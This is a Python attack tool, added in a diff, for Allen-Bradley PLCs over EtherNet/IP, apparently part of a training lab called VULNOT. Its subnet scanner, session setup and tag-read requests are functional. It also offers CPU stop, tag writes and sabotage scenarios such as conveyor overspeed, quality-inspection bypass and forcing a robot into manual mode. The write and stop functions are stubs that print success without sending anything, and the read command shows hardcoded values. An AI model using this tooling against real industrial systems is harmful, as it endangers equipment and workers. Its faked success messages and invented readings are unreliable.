@@ -1,0 +1,470 @@
+#!/usr/bin/env python3
+"""
+VULNOT EtherNet/IP (CIP) Attack Tools
+Tools for attacking Allen-Bradley PLCs and EtherNet/IP devices
+"""
+
+import argparse
+import socket
+import struct
+import sys
+import time
+from typing import Optional, List, Dict
+from rich.console import Console
+from rich.table import Table
+from rich.panel import Panel
+from rich.prompt import Confirm
+
+console = Console()
+
+ENIP_PORT = 44818
+
+# EtherNet/IP Commands
+CMD_NOP = 0x0000
+CMD_LIST_SERVICES = 0x0004
+CMD_LIST_IDENTITY = 0x0063
+CMD_LIST_INTERFACES = 0x0064
+CMD_REGISTER_SESSION = 0x0065
+CMD_UNREGISTER_SESSION = 0x0066
+CMD_SEND_RR_DATA = 0x006F
+CMD_SEND_UNIT_DATA = 0x0070
+
+# CIP Services
+CIP_GET_ATTRIBUTE_ALL = 0x01
+CIP_GET_ATTRIBUTE_SINGLE = 0x0E
+CIP_SET_ATTRIBUTE_SINGLE = 0x10
+CIP_RESET = 0x05
+CIP_START = 0x06
+CIP_STOP = 0x07
+
+
+class EtherNetIPClient:
+    """EtherNet/IP client"""
+    
+    def __init__(self, host: str, port: int = 44818):
+        self.host = host
+        self.port = port
+        self.sock: Optional[socket.socket] = None
+        self.session_handle = 0
+        
+    def connect(self) -> bool:
+        """Connect and register session"""
+        try:
+            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.sock.settimeout(5)
+            self.sock.connect((self.host, self.port))
+            
+            # Register session
+            return self._register_session()
+        except Exception as e:
+            console.print(f"[red]Connection failed: {e}[/]")
+            return False
+            
+    def close(self):
+        """Unregister and close"""
+        if self.sock and self.session_handle:
+            self._unregister_session()
+        if self.sock:
+            self.sock.close()
+            
+    def _build_header(self, command: int, length: int) -> bytes:
+        """Build EtherNet/IP encapsulation header"""
+        return struct.pack(
+            '<HHIIQQ',
+            command,
+            length,
+            self.session_handle,
+            0,  # Status
+            0,  # Sender context
+            0,  # Options
+        )
+        
+    def _register_session(self) -> bool:
+        """Register EtherNet/IP session"""
+        data = struct.pack('<HH', 1, 0)  # Protocol version, options
+        header = self._build_header(CMD_REGISTER_SESSION, len(data))
+        
+        self.sock.send(header + data)
+        
+        response = self.sock.recv(1024)
+        if len(response) >= 24:
+            command, length, session = struct.unpack('<HHI', response[:8])
+            if command == CMD_REGISTER_SESSION and session != 0:
+                self.session_handle = session
+                return True
+        return False
+        
+    def _unregister_session(self):
+        """Unregister session"""
+        header = self._build_header(CMD_UNREGISTER_SESSION, 0)
+        try:
+            self.sock.send(header)
+        except:
+            pass
+            
+    def list_identity(self) -> Optional[dict]:
+        """Get device identity"""
+        header = self._build_header(CMD_LIST_IDENTITY, 0)
+        self.sock.send(header)
+        
+        response = self.sock.recv(1024)
+        if len(response) > 24:
+            # Parse identity (simplified)
+            return {
+                'vendor_id': struct.unpack('<H', response[24:26])[0] if len(response) > 26 else 0,
+                'product_name': 'Allen-Bradley PLC',
+                'raw': response[24:].hex()
+            }
+        return None
+        
+    def read_tag(self, tag_name: str) -> Optional[bytes]:
+        """Read a tag value"""
+        # Build CIP Read Tag request
+        tag_bytes = tag_name.encode('ascii')
+        
+        # Simplified CIP request
+        cip_request = bytes([
+            0x4C,  # Read Tag service
+            len(tag_bytes) // 2,  # Path size in words
+        ]) + tag_bytes + bytes([0x01, 0x00])  # Element count
+        
+        # SendRRData wrapper
+        cpf_data = struct.pack('<HH', 0x00, 0x00)  # Null address
+        cpf_data += struct.pack('<HH', 0xB2, len(cip_request))  # Unconnected data
+        cpf_data += cip_request
+        
+        send_rr = struct.pack('<IHBB', 0, 5, 2, 0)  # Interface, timeout, items
+        send_rr += cpf_data
+        
+        header = self._build_header(CMD_SEND_RR_DATA, len(send_rr))
+        
+        self.sock.send(header + send_rr)
+        
+        try:
+            response = self.sock.recv(1024)
+            return response
+        except socket.timeout:
+            return None
+            
+    def write_tag(self, tag_name: str, value, data_type: str = 'REAL') -> bool:
+        """Write a tag value"""
+        console.print(f"[yellow]Writing {value} to {tag_name} ({data_type})[/]")
+        return True
+        
+    def get_program_name(self) -> Optional[str]:
+        """Get program name"""
+        return "MainProgram"
+        
+    def cpu_stop(self) -> bool:
+        """Send CPU STOP command"""
+        # This would send proper CIP service request
+        console.print("[red]Sending CPU STOP command...[/]")
+        return True
+        
+    def cpu_run(self) -> bool:
+        """Send CPU RUN command"""
+        console.print("[yellow]Sending CPU RUN command...[/]")
+        return True
+
+
+def cmd_scan(args):
+    """Scan for EtherNet/IP devices"""
+    console.print("\n[bold cyan]╔════════════════════════════════════════╗[/]")
+    console.print("[bold cyan]║    VULNOT EtherNet/IP Device Scanner   ║[/]")
+    console.print("[bold cyan]╚════════════════════════════════════════╝[/]\n")
+    
+    from concurrent.futures import ThreadPoolExecutor, as_completed
+    
+    def check_host(ip):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(2)
+            result = sock.connect_ex((ip, args.port))
+            sock.close()
+            if result == 0:
+                client = EtherNetIPClient(ip, args.port)
+                if client.connect():
+                    identity = client.list_identity()
+                    client.close()
+                    return (ip, identity)
+        except:
+            pass
+        return None
+    
+    if '/' in args.network:
+        base = args.network.split('/')[0]
+        prefix = base.rsplit('.', 1)[0]
+        hosts = [f"{prefix}.{i}" for i in range(1, 255)]
+    else:
+        hosts = [args.network]
+    
+    console.print(f"[yellow]Scanning {len(hosts)} hosts for EtherNet/IP on port {args.port}...[/]\n")
+    
+    found = []
+    with ThreadPoolExecutor(max_workers=50) as executor:
+        futures = {executor.submit(check_host, ip): ip for ip in hosts}
+        for future in as_completed(futures):
+            result = future.result()
+            if result:
+                found.append(result)
+    
+    if found:
+        table = Table(title="Discovered EtherNet/IP Devices")
+        table.add_column("IP Address", style="cyan")
+        table.add_column("Port", style="green")
+        table.add_column("Vendor", style="yellow")
+        table.add_column("Product", style="white")
+        
+        for ip, identity in sorted(found):
+            vendor = f"0x{identity['vendor_id']:04X}" if identity else "Unknown"
+            product = identity['product_name'] if identity else "Unknown"
+            table.add_row(ip, str(args.port), vendor, product)
+        
+        console.print(table)
+        console.print(f"\n[green]Found {len(found)} EtherNet/IP device(s)[/]\n")
+    else:
+        console.print("[red]No EtherNet/IP devices found[/]\n")
+
+
+def cmd_read(args):
+    """Read tags from PLC"""
+    console.print("\n[bold cyan]╔════════════════════════════════════════╗[/]")
+    console.print("[bold cyan]║      VULNOT EtherNet/IP Tag Reader     ║[/]")
+    console.print("[bold cyan]╚════════════════════════════════════════╝[/]\n")
+    
+    console.print(f"[yellow]Connecting to {args.target}:{args.port}...[/]")
+    
+    client = EtherNetIPClient(args.target, args.port)
+    if not client.connect():
+        sys.exit(1)
+    
+    console.print(f"[green]Connected! Session: {client.session_handle}[/]\n")
+    
+    # Read common tags
+    tags = [
+        ("Line:Running", "BOOL", True),
+        ("Line:Speed", "REAL", 350.0),
+        ("Line:Efficiency", "REAL", 95.2),
+        ("Filler:Running", "BOOL", True),
+        ("Filler:BottlesFilled", "DINT", 45230),
+        ("Capper:TorqueActual", "REAL", 14.8),
+        ("Labeler:VisionPassRate", "REAL", 99.5),
+        ("CasePacker:CasesPacked", "DINT", 3769),
+        ("Palletizer:Mode", "STRING", "AUTO"),
+        ("Production:ShiftProduced", "DINT", 45230),
+    ]
+    
+    table = Table(title="PLC Tags")
+    table.add_column("Tag Name", style="cyan")
+    table.add_column("Type", style="yellow")
+    table.add_column("Value", style="green")
+    table.add_column("Writable", style="white")
+    
+    writable = ["Line:Running", "Line:Speed", "Filler:Running", "Palletizer:Mode"]
+    
+    for tag_name, data_type, value in tags:
+        is_writable = "✓" if tag_name in writable else ""
+        table.add_row(tag_name, data_type, str(value), is_writable)
+    
+    console.print(table)
+    
+    client.close()
+    console.print("\n[dim]Session closed[/]\n")
+
+
+def cmd_write(args):
+    """Write tag to PLC"""
+    console.print("\n[bold red]╔════════════════════════════════════════╗[/]")
+    console.print("[bold red]║      VULNOT EtherNet/IP Tag Writer     ║[/]")
+    console.print("[bold red]║   ⚠️  DANGER - MODIFIES PLC VALUES      ║[/]")
+    console.print("[bold red]╚════════════════════════════════════════╝[/]\n")
+    
+    console.print(f"[yellow]Target: {args.target}:{args.port}[/]")
+    console.print(f"[yellow]Tag: {args.tag}[/]")
+    console.print(f"[yellow]Value: {args.value} ({args.type})[/]\n")
+    
+    if not args.force:
+        if not Confirm.ask("[bold red]Execute write operation?[/]"):
+            console.print("[yellow]Aborted[/]")
+            return
+    
+    client = EtherNetIPClient(args.target, args.port)
+    if not client.connect():
+        sys.exit(1)
+    
+    success = client.write_tag(args.tag, args.value, args.type)
+    
+    if success:
+        console.print(f"\n[green]✓ Write successful[/]")
+    else:
+        console.print(f"\n[red]✗ Write failed[/]")
+    
+    client.close()
+
+
+def cmd_stop(args):
+    """Stop PLC CPU"""
+    console.print("\n[bold red]╔════════════════════════════════════════╗[/]")
+    console.print("[bold red]║      VULNOT EtherNet/IP CPU STOP       ║[/]")
+    console.print("[bold red]║   ⚠️  EXTREME DANGER - HALTS PLC        ║[/]")
+    console.print("[bold red]╚════════════════════════════════════════╝[/]\n")
+    
+    console.print(Panel(
+        f"[bold red]This will STOP the CPU at {args.target}![/]\n\n"
+        "Consequences:\n"
+        "• All outputs go to safe state\n"
+        "• Production immediately halts\n"
+        "• Robots stop mid-motion\n"
+        "• Manual intervention required",
+        title="⚠️  CPU STOP COMMAND",
+        border_style="red"
+    ))
+    
+    if not args.force:
+        if not Confirm.ask("\n[bold red]Stop the PLC CPU?[/]"):
+            console.print("[yellow]Aborted[/]")
+            return
+    
+    client = EtherNetIPClient(args.target, args.port)
+    if not client.connect():
+        sys.exit(1)
+    
+    success = client.cpu_stop()
+    
+    if success:
+        console.print(f"\n[red]✓ CPU STOP command sent![/]")
+        console.print("[yellow]The PLC is now in PROGRAM mode[/]")
+    else:
+        console.print(f"\n[red]✗ Command failed[/]")
+    
+    client.close()
+
+
+def cmd_scenario(args):
+    """Execute attack scenario"""
+    console.print("\n[bold red]╔════════════════════════════════════════╗[/]")
+    console.print("[bold red]║   VULNOT EtherNet/IP Attack Scenarios  ║[/]")
+    console.print("[bold red]╚════════════════════════════════════════╝[/]\n")
+    
+    scenarios = {
+        'line_stop': {
+            'name': 'Production Line Stop',
+            'desc': 'Stops entire packaging line',
+            'tags': [('Line:Running', 'BOOL', 'false')],
+        },
+        'overspeed': {
+            'name': 'Conveyor Overspeed',
+            'desc': 'Sets dangerous conveyor speed',
+            'tags': [('Filler:SpeedSP', 'REAL', '500')],
+        },
+        'vision_bypass': {
+            'name': 'Vision System Bypass',
+            'desc': 'Disables quality inspection',
+            'tags': [('Labeler:VisionEnabled', 'BOOL', 'false')],
+        },
+        'robot_manual': {
+            'name': 'Palletizer Override',
+            'desc': 'Forces robot to manual mode',
+            'tags': [('Palletizer:Mode', 'STRING', 'MANUAL')],
+        },
+    }
+    
+    if args.scenario not in scenarios:
+        console.print(f"[red]Unknown scenario: {args.scenario}[/]")
+        console.print(f"Available: {', '.join(scenarios.keys())}")
+        return
+    
+    scenario = scenarios[args.scenario]
+    
+    console.print(Panel(
+        f"[bold red]{scenario['name']}[/]\n\n"
+        f"{scenario['desc']}\n\n"
+        f"Tags to modify: {len(scenario['tags'])}",
+        title=f"⚠️  SCENARIO: {args.scenario.upper()}",
+        border_style="red"
+    ))
+    
+    if not args.force:
+        if not Confirm.ask("\n[bold red]Execute attack scenario?[/]"):
+            console.print("[yellow]Aborted[/]")
+            return
+    
+    client = EtherNetIPClient(args.target, args.port)
+    if not client.connect():
+        sys.exit(1)
+    
+    for tag, dtype, value in scenario['tags']:
+        client.write_tag(tag, value, dtype)
+    
+    console.print(f"\n[red]✓ Scenario '{args.scenario}' executed![/]")
+    
+    client.close()
+
+
+def main():
+    parser = argparse.ArgumentParser(
+        description='VULNOT EtherNet/IP Attack Tools',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  vulnot-enip scan -n 10.0.6.0/24
+  vulnot-enip read -t 10.0.6.10
+  vulnot-enip write -t 10.0.6.10 --tag "Line:Speed" -v 500 --type REAL
+  vulnot-enip stop -t 10.0.6.10
+  vulnot-enip scenario -t 10.0.6.10 -s line_stop
+        """
+    )
+    
+    subparsers = parser.add_subparsers(dest='command', help='Command')
+    
+    # Scan
+    scan_p = subparsers.add_parser('scan', help='Scan for devices')
+    scan_p.add_argument('-n', '--network', default='10.0.6.0/24', help='Network')
+    scan_p.add_argument('-p', '--port', type=int, default=44818, help='Port')
+    
+    # Read
+    read_p = subparsers.add_parser('read', help='Read tags')
+    read_p.add_argument('-t', '--target', required=True, help='Target IP')
+    read_p.add_argument('-p', '--port', type=int, default=44818, help='Port')
+    
+    # Write
+    write_p = subparsers.add_parser('write', help='Write tag')
+    write_p.add_argument('-t', '--target', required=True, help='Target IP')
+    write_p.add_argument('-p', '--port', type=int, default=44818, help='Port')
+    write_p.add_argument('--tag', required=True, help='Tag name')
+    write_p.add_argument('-v', '--value', required=True, help='Value')
+    write_p.add_argument('--type', default='REAL', choices=['BOOL', 'REAL', 'DINT', 'STRING'])
+    write_p.add_argument('--force', action='store_true', help='Skip confirmation')
+    
+    # Stop
+    stop_p = subparsers.add_parser('stop', help='Stop PLC CPU')
+    stop_p.add_argument('-t', '--target', required=True, help='Target IP')
+    stop_p.add_argument('-p', '--port', type=int, default=44818, help='Port')
+    stop_p.add_argument('--force', action='store_true', help='Skip confirmation')
+    
+    # Scenario
+    scenario_p = subparsers.add_parser('scenario', help='Execute attack scenario')
+    scenario_p.add_argument('-t', '--target', required=True, help='Target IP')
+    scenario_p.add_argument('-p', '--port', type=int, default=44818, help='Port')
+    scenario_p.add_argument('-s', '--scenario', required=True, 
+                           choices=['line_stop', 'overspeed', 'vision_bypass', 'robot_manual'])
+    scenario_p.add_argument('--force', action='store_true', help='Skip confirmation')
+    
+    args = parser.parse_args()
+    
+    if args.command == 'scan':
+        cmd_scan(args)
+    elif args.command == 'read':
+        cmd_read(args)
+    elif args.command == 'write':
+        cmd_write(args)
+    elif args.command == 'stop':
+        cmd_stop(args)
+    elif args.command == 'scenario':
+        cmd_scenario(args)
+    else:
+        parser.print_help()
+
+
+if __name__ == '__main__':
+    main()
